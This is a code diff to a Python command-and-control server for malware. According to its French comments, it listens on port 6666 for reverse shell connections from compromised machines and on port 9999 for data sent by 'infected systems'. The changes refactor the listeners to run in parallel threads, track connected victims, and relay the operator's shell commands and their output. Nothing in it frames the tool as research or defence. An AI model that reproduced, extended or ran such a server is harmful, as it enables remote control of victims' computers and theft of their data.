@@ -10,10 +10,17 @@ import json
 
 class Server():
     def __init__(self):
+        self._host = "0.0.0.0"
+        self.cSocketList = []
+        self.cAddrList = []
+        self._serverThreadList = [self._serverData, self._serverReverseShell]
+
+
+    def returnServerList(self):
         pass
 
     @staticmethod
-    def clrscr():
+    def _clrscr():
             if platform.system() == "Linux":
                 os.system("clear")
             elif platform.system() == "Windows":
@@ -34,14 +41,17 @@ class Server():
 
     def _systemData(self, c):
         data = {}
-        while True:
+        quitting = False
+        while not quitting:
+
+            data = self._receiving(c)
             if data["message"] == "exit":
                 c.close()
-                break
+                quitting = True
             else:
-                # TODO: Change print for DAO 
-                data = self._receiving(c)
                 print(data["message"])
+                
+            # TODO: Change print for DAO 
 
     def _ReverseShell(self, c):
 
@@ -55,7 +65,7 @@ class Server():
             if not data["command"].strip():
                 continue
             elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
-                self.clrscr()
+                self._clrscr()
                 continue
             else:
                 # c.send(self.encode(data))
@@ -69,22 +79,24 @@ class Server():
         
             print(data["output"])
 
-    def _serverReverseShell(self):
+    def _serverReverseShell(self, s):
         # Démarre le service pour recevoir les connexions ReverseShell
         c = None
         addr = None
 
-        s = socket.socket()
+        # On crée un objet socket
+        # s = socket.socket()
 
-        host = "0.0.0.0"
         port = 6666
 
-        s.bind((host, port))
+        s.bind((self._host, port))
         s.listen(5)
 
         while True:
             try:
                 c, addr = s.accept()
+                self.cSocketList.append(c)
+                self.cAddrList.append(addr)
                 print('Got connection from', addr)
 
                 # On crée un thread receiving data
@@ -98,22 +110,23 @@ class Server():
                 continue
     
 
-    def _serverData(self):
+    def _serverData(self, s):
         # Démarre le service pour recevoir les données des systèmes infectés
 
         c = None
         addr = None
 
-        s = socket.socket()
-        host = "0.0.0.0"
+        # On crée un objet socket
+        # s = socket.socket()
+
         port = 9999
-        s.bind((host, port))
+        s.bind((self._host, port))
         s.listen(5)
 
         while True:
             c, addr = s.accept()
             print('Got connection from', addr)
-            
+
             # On crée un thread receiving data
             connection_handler = threading.Thread(
                 target=self._systemData,
@@ -124,7 +137,10 @@ class Server():
 
     def main(self):
         # Démarre deux threads pour recevoir les connexions ReverseShell et d'envoi de données
-        self._serverReverseShell()
+        for server in self._serverThreadList:
+            s = socket.socket()
+            threading.Thread(target=server, args=(s,)).start()
+            
 
     
 
